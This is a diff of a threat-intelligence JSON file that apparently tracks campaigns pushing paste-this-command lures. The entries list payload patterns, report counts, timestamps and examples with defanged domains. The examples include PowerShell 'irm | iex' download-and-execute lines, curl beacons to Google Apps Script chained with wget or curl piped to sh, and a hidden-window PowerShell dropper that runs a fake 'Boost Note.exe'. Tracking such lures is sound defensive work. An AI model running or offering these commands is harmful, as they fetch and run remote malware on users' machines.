@@ -1,12 +1,11 @@
 [
   {
     "Pattern": "irm '<URL>'|iex;",
-    "DistinctPayloadCount": 131,
-    "ReportCount": 131,
-    "FirstSeen": "2026-11-16T09:40:47.966000+00:00",
+    "DistinctPayloadCount": 130,
+    "ReportCount": 130,
+    "FirstSeen": "2026-11-16T16:04:15.798000+00:00",
     "LastSeen": "2026-11-22T12:29:08.297000+00:00",
     "ReportIds": [
-      "cmwj2pfpi16fo0oml58q7h0a1",
       "cmwjgekmp17wn0omlkwsofjbb",
       "cmwjgg9dc17z70oml35rrf75e",
       "cmwjgjbds18760omlye859nvq",
@@ -244,7 +243,6 @@
       "irm 'browse-cloud.codes/f575605f2cabbf3b'|iex;",
       "irm 'browse-cloud.codes/f6f41b91b95bf127'|iex;",
       "irm 'browse-cloud.codes/f787aa2bee9432bb'|iex;",
-      "irm 'browse-cloud.codes/f7ed5df838d3e4b9'|iex;",
       "irm 'browse-cloud.codes/f8d105660261b6d8'|iex;",
       "irm 'browse-cloud.codes/fa625dfc6bcfb436'|iex;",
       "irm 'browse-cloud.codes/fe3d91f20708755d'|iex;",
@@ -523,12 +521,11 @@
   },
   {
     "Pattern": "curl -sL -d \"id=<UUID>&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=<ENCODED_URL>&os=Linux%20x86_64&lastVisitAt=<TIMESTAMP>&lastShellAt=<TIMESTAMP>\" \"<URL>\" && wget -qO- '<URL>' -L | sh",
-    "DistinctPayloadCount": 41,
-    "ReportCount": 41,
-    "FirstSeen": "2026-11-16T09:53:58.154000+00:00",
+    "DistinctPayloadCount": 40,
+    "ReportCount": 40,
+    "FirstSeen": "2026-11-17T16:39:56.362000+00:00",
     "LastSeen": "2026-11-22T12:26:22.780000+00:00",
     "ReportIds": [
-      "cmwj36dfi16xf0omlymjsogg9",
       "cmwkx4azd1gvm0oml0vqhoa4u",
       "cmwli29bg1j3e0omltxtam4iu",
       "cmwliffs71jg90omldft1fkjb",
@@ -573,7 +570,6 @@
     "PayloadExamples": [
       "curl -sL -d \"id=0c32a677-0f6c-4cca-8791-e2bc6757bdad&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fthenextrightmovenow[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-21T05%3A39%3A58.155Z&lastShellAt=2026-11-21T05%3A39%3A58.155Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
       "curl -sL -d \"id=2d4d68ed-9b81-40d6-976e-c7786c281fef&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fgrupoporraspyp[.]net%2F&os=Linux%20x86_64&lastVisitAt=2026-11-21T18%3A07%3A57.729Z&lastShellAt=2026-11-21T18%3A07%3A57.729Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
-      "curl -sL -d \"id=3a96f2ac-d8cc-4a7c-aff7-af9a616c7694&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fsolidhome110[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-16T09%3A52%3A35.491Z&lastShellAt=2026-11-16T09%3A52%3A35.491Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://claude-flare-verification[.]vercel[.]app/lin' -L | sh",
       "curl -sL -d \"id=475c2e82-40b8-4a03-9bea-e9036c8286df&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fuktopthesis[.]co[.]uk%2F&os=Linux%20x86_64&lastVisitAt=2026-11-22T12%3A18%3A54.377Z&lastShellAt=2026-11-22T12%3A18%3A54.377Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://claude-flare-verification[.]vercel[.]app/lin' -L | sh",
       "curl -sL -d \"id=4a0a0daf-c7d6-4513-bd87-3444e0d9de2d&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fcreativecornerbd[.]shop%2F&os=Linux%20x86_64&lastVisitAt=2026-11-21T17%3A49%3A29.801Z&lastShellAt=2026-11-21T17%3A49%3A29.801Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://claude-flare-verification[.]vercel[.]app/lin' -L | sh",
       "curl -sL -d \"id=4cadef93-7fcb-4dce-84b4-54cedbcdb9b5&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fbc-aba[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-18T02%3A35%3A33.317Z&lastShellAt=2026-11-18T02%3A35%3A33.317Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://claude-flare-verification[.]vercel[.]app/lin' -L | sh",
@@ -616,12 +612,11 @@
   },
   {
     "Pattern": "curl -sL -d \"id=<UUID>&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=<ENCODED_URL>&os=Linux%20x86_64&lastVisitAt=<TIMESTAMP>&lastShellAt=<TIMESTAMP>\" \"<URL>\" && curl -fsSL \"<URL>\" | sh",
-    "DistinctPayloadCount": 28,
-    "ReportCount": 28,
-    "FirstSeen": "2026-11-16T09:56:50.445000+00:00",
+    "DistinctPayloadCount": 27,
+    "ReportCount": 27,
+    "FirstSeen": "2026-11-17T17:04:25.556000+00:00",
     "LastSeen": "2026-11-22T08:23:05.111000+00:00",
     "ReportIds": [
-      "cmwj3a2cb17150omlr80ejlu5",
       "cmwkxzsn51ha40oml7u9p2ams",
       "cmwkylgu31hgf0omlnkd2tiw6",
       "cmwlhzglo1ix20oml8bipu4in",
@@ -674,7 +669,6 @@
       "curl -sL -d \"id=b2dd4ed9-0ed8-408c-a316-cfa41ffd0bce&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fwww[.]fitnessmarketplace[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-21T17%3A47%3A40.214Z&lastShellAt=2026-11-21T17%3A47%3A40.214Z\" \"https://script[.]google[.]com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec\" && curl -fsSL \"https://softify[.]lat/u/8ecec3ba\" | sh",
       "curl -sL -d \"id=b94b96ec-0390-4c9b-9453-3a073be7bf42&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=http%3A%2F%2Fshabdmat[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-21T17%3A54%3A46.109Z&lastShellAt=2026-11-21T17%3A54%3A46.109Z\" \"https://script[.]google[.]com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec\" && curl -fsSL \"https://softify[.]lat/u/8ecec3ba\" | sh",
       "curl -sL -d \"id=d049be52-b4dd-4a5b-aa4e-b96eb3410e0f&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fhaojindrc[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-18T04%3A54%3A41.219Z&lastShellAt=2026-11-18T04%3A54%3A41.219Z\" \"https://script[.]google[.]com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec\" && curl -fsSL \"https://softify[.]lat/u/8ecec3ba\" | sh",
-      "curl -sL -d \"id=d8cd13f9-945f-4e56-ac4b-f1eb67c3700a&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fwww[.]atb[.]ikaya[.]nl%2F&os=Linux%20x86_64&lastVisitAt=2026-11-16T09%3A55%3A25.496Z&lastShellAt=2026-11-16T09%3A55%3A25.496Z\" \"https://script[.]google[.]com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec\" && curl -fsSL \"https://softify[.]lat/u/8ecec3ba\" | sh",
       "curl -sL -d \"id=d8d74ae8-29cf-4227-8d01-a3e127c7b2dc&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Findesigner.co.za%2F&os=Linux%20x86_64&lastVisitAt=2026-11-17T17%3A19%3A50.957Z&lastShellAt=2026-11-17T17%3A19%3A50.957Z\" \"https://script[.]google[.]com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec\" && curl -fsSL \"https://softify[.]lat/u/f4683ebb\" | sh",
       "curl -sL -d \"id=da716e3a-6d47-438c-8a1a-c56edf1627c1&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fhotelcostamar[.]net%2F&os=Linux%20x86_64&lastVisitAt=2026-11-18T05%3A02%3A55.632Z&lastShellAt=2026-11-18T05%3A02%3A55.632Z\" \"https://script[.]google[.]com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec\" && curl -fsSL \"https://softify[.]lat/u/8ecec3ba\" | sh",
       "curl -sL -d \"id=ec79056e-7102-45d8-b5e9-b67d5646397e&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Ftophatlogisticsllc[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-21T17%3A47%3A53.845Z&lastShellAt=2026-11-21T17%3A47%3A53.845Z\" \"https://script[.]google[.]com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec\" && curl -fsSL \"https://softify[.]lat/u/8ecec3ba\" | sh",
@@ -684,11 +678,10 @@
   {
     "Pattern": "IRM <URL> | IEX",
     "DistinctPayloadCount": 10,
-    "ReportCount": 55,
-    "FirstSeen": "2026-11-16T09:40:35.633000+00:00",
+    "ReportCount": 54,
+    "FirstSeen": "2026-11-16T18:11:22.915000+00:00",
     "LastSeen": "2026-11-22T05:17:52.705000+00:00",
     "ReportIds": [
-      "cmwj2p67u16ef0oml8gvz64x2",
       "cmwjky1uy18u30oml4osuzwws",
       "cmwjvzcgx19280omlttmi8ydj",
       "cmwk6gsan1akk0oml325oec4f",
@@ -790,13 +783,10 @@
   {
     "Pattern": "$url = \"<URL>\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
     "DistinctPayloadCount": 1,
-    "ReportCount": 31,
-    "FirstSeen": "2026-11-16T09:51:37.066000+00:00",
+    "ReportCount": 28,
+    "FirstSeen": "2026-11-16T10:47:58.057000+00:00",
     "LastSeen": "2026-11-20T17:27:10.495000+00:00",
     "ReportIds": [
-      "cmwj33cj016tu0oml5m5v87wb",
-      "cmwj36tyq16yb0omldf4pvs2n",
-      "cmwj382w016zu0omlgui30fhv",
       "cmwj53tef17dk0omlyyz1wnrf",
       "cmwj87puz17h00omlv4msyyuh",
       "cmwjbc38k17of0omlpeppcn8t",
